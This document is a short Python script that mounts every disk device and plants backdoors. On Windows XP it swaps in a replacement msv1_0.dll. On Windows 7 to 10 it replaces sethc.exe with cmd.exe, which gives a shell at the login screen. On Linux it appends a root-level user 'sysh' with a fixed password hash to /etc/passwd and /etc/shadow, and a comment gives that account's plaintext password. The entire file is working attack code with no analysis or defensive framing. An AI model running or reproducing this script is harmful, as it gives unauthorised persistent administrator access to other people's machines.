#!/usr/bin/python
import os
from os import listdir
from os.path import isfile, join

#username:password for linux
#sysh: Iamalive


for  devs in listdir("/dev"):
	
	if devs[0] == 's' or devs[0] =='h' and devs[1]=='d':
				
		try:
			os.system("mkdir /mnt/"+devs)
			os.system("mount /dev/"+devs+" /mnt/"+devs)
					
		except:
			os.system("rm /mnt/"+devs)
			continue
		
		subdir = listdir("/mnt/"+devs)
		
		if isfile("/mnt/"+devs+"/boot.ini"):   # for win xp
			try:
				os.system("mv /mnt/"+devs+"/WINDOWS/System32/msv1_0.dll /mnt/"+devs+"/WINDOWS/System32/msvback.dll")
				
			except:
				print "error occured in windows xp"
			finally:
				os.system("cp msv1_0.dll /mnt/"+devs+"/WINDOWS/System32/msv1_0.dll")
				print "Backdoor created under win xp"
		
		elif "Windows" in subdir and "Program Files" in subdir:  # for win 7,8,10
			try:
				os.system("mv /mnt/"+devs+"/Windows/System32/sethc.exe /mnt/"+devs+"/Windows/System32/sethc.bak")
						
			except:
				print "error occured in windows"
			finally:
				os.system("cp /mnt/"+devs+"/Windows/System32/cmd.exe /mnt/"+devs+"/Windows/System32/sethc.exe")
				print "Backdoor created in Windows."
				
				
		elif "etc" in subdir and "dev" in subdir and "bin" in subdir:  #for linux all
			
			if isfile("/mnt/"+devs+"/etc/shadow"):
				try:
					os.system('echo "sysh:x:0:0:sysh:/home:/bin/bash" >> /mnt/'+devs+'/etc/passwd')
					os.system('echo "sysh:\$6\$LnQBiZgD\$T5PdCSXzM1hjAJt/YV48mo/RVo/g4bdeP7TYf1KxAE9QsRoroipUvopR5ZECf3qq8lWUF4saNZxqz5CT8GwFK1:16896:0:99999:7:::" >> /mnt/'+devs+'/etc/shadow')
					print "Another user 'sysh' created with root privileges"
				
				except:
					print "error occured in linux" 
		
		
